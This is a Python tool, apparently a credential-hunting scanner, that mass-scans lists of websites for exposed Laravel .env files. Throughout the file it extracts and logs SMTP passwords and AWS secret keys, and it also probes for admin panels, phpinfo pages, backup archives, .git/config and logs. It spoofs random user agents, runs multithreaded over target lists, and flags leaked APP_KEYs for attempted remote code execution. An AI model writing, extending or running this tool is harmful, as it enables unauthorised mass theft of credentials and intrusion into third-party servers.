'''coded by Raymond7'''
'''lets hunt'''
import requests
import sys
import threading
import re
import random
from datetime import datetime
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Config
timeout = 10
lock = threading.Lock()
output_file = "results.txt"

# SMTP keyword list for .env extraction
smtp_keywords = ["MAIL_HOST", "MAIL_PORT", "MAIL_USERNAME", "MAIL_PASSWORD", "MAIL_ENCRYPTION"]

# AWS key indicators in .env
aws_keywords = ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_DEFAULT_REGION"]

# Known panel paths
known_panels = [
    "admin.php", "login.php", "administrator/index.php",
    "cpanel/", "admin/login.php", "user/login.php"
]

# PHP info file names
php_info_files = ["info.php", "phpinfo.php"]

# Common backup file names
backup_files = [
    ".env.bak", "backup.zip", "site.tar.gz", "backup.tar", "db.sql", "db_backup.sql"
]

# Common indexable paths
indexable_dirs = ["uploads/", "backup/", "files/", "data/"]

# Extra sensitive Laravel paths
extra_sensitive_paths = [
    "/vendor/phpunit/phpunit/phpunit",
    "/.git/config",
    "/storage/logs/laravel.log",
    "/.DS_Store",
    "/server-status"
]

# Random User-Agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]

def log_result(message):
    with lock:
        print(message)
        with open(output_file, "a") as f:
            f.write(f"{datetime.now()} - {message}\n")

def extract_env_values(text):
    env_data = {}
    for line in text.splitlines():
        match = re.match(r'^(\w+)=([^\"]*)$', line)
        if match and (match.group(1) in smtp_keywords or match.group(1) in aws_keywords):
            env_data[match.group(1)] = match.group(2)
    return env_data

def scan_sensitive_paths(target_url):
    headers = {"User-Agent": random.choice(user_agents)}
    for path in extra_sensitive_paths:
        url = f"{target_url.rstrip('/')}{path}"
        try:
            response = requests.get(url, timeout=timeout, headers=headers)
            if response.status_code == 200:
                log_result(f"[!] Sensitive file found: {url}")
        except requests.RequestException:
            continue

def attempt_rce_phpinfo(target_url):
    test_url = f"{target_url.rstrip('/')}/.env"
    try:
        response = requests.get(test_url, timeout=timeout)
        if response.status_code == 200 and "APP_KEY" in response.text:
            log_result("[✓] Laravel App Key Leak Detected, attempt remote code execution if possible")
    except requests.RequestException:
        pass

def scan_target(target_url):
    headers = {"User-Agent": random.choice(user_agents)}

    # 1. Attempt to fetch .env
    env_url = f"{target_url.rstrip('/')}/.env"
    found_env = False
    try:
        response = requests.get(env_url, timeout=timeout, headers=headers)
        if response.status_code == 200 and (any(key in response.text for key in smtp_keywords + aws_keywords)):
            log_result(f"[!!!] .env file FOUND: {env_url}")
            env_values = extract_env_values(response.text)
            for key, val in env_values.items():
                log_result(f"    {key}={val}")
            found_env = True
    except requests.RequestException:
        pass

    if not found_env:
        log_result(f"[-] .env not found at {env_url}. Skipping further checks.")
        return

    # 2. Scan known panels
    for path in known_panels:
        url = f"{target_url.rstrip('/')}/{path}"
        try:
            response = requests.get(url, timeout=timeout, headers=headers)
            if response.status_code == 200:
                log_result(f"[+] Panel found: {url}")
        except requests.RequestException:
            continue

    # 3. Scan for PHP info files
    for path in php_info_files:
        url = f"{target_url.rstrip('/')}/{path}"
        try:
            response = requests.get(url, timeout=timeout, headers=headers)
            if response.status_code == 200 and "phpinfo" in response.text.lower():
                log_result(f"[!] PHP Info File Found: {url}")
                attempt_rce_phpinfo(target_url)
        except requests.RequestException:
            continue

    # 4. Try backup files
    for path in backup_files:
        url = f"{target_url.rstrip('/')}/{path}"
        try:
            response = requests.get(url, timeout=timeout, headers=headers)
            if response.status_code == 200:
                log_result(f"[!] Backup file found: {url}")
        except requests.RequestException:
            continue

    # 5. Check for indexable directories
    for path in indexable_dirs:
        url = f"{target_url.rstrip('/')}/{path}"
        try:
            response = requests.get(url, timeout=timeout, headers=headers)
            if response.status_code == 200 and ("Index of" in response.text or "Parent Directory" in response.text):
                log_result(f"[!] Indexable directory found: {url}")
        except requests.RequestException:
            continue

    # 6. Scan additional Laravel sensitive paths
    scan_sensitive_paths(target_url)

def main():
    print(Fore.RED + """
   _____                         
  / ____|                        
 | (___   ___  __ _ _ __   ___  
  \___ \ / _ \/ _` | '_ \ / _ \ 
  ____) |  __/ (_| | | | |  __/ 
 |_____/ \___|\__,_|_| |_|\___|  
    """ + Fore.YELLOW + "by Sean" + Style.RESET_ALL)

    while True:
        print("\n[1] Single Target Scan")
        print("[2] Mass Target Scan")
        print("[3] Exit")
        choice = input("Select an option: ")

        if choice == '1':
            target = input("Enter the target URL: ")
            with open(output_file, "w") as f:
                f.write("--- Laravel Env Scanner Report ---\n")
            scan_target(target)

        elif choice == '2':
            file_path = input("Enter path to target list (e.g., targets.txt): ")
            try:
                with open(file_path) as f:
                    targets = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print("[!] File not found.")
                continue

            thread_count = input("Enter number of threads: ")
            try:
                thread_count = int(thread_count)
            except ValueError:
                print("[!] Invalid thread count.")
                continue

            with open(output_file, "w") as f:
                f.write("--- Laravel Env Scanner Report ---\n")

            threads = []
            for target in targets:
                t = threading.Thread(target=scan_target, args=(target,))
                t.start()
                threads.append(t)
                if len(threads) >= thread_count:
                    for t in threads:
                        t.join()
                    threads = []

            # Final join for remaining threads
            for t in threads:
                t.join()

        elif choice == '3':
            print("Goodbye!")
            break

        else:
            print("[!] Invalid option. Try again.")

if __name__ == "__main__":
    main()
